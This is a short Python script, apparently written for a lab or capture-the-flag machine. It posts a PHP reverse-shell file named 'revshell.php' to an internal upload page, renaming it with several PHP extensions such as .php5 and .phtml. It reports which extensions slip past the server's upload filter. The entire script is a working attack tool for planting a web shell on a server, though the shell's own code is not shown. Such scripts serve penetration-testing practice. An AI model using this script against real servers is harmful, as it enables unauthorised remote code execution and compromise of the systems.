#!/usr/bin/python3

import requests

ip = "10.10.223.21"
url = f"http://{ip}:3333/internal/index.php"

shell = open("revshell.php", 'rb')
file_basename = "revshell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extensions:
    filename_full = f"{file_basename}{ext}"
    files = {'file': (filename_full, shell)}
    r = requests.post(url, files=files)
    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} allowed")
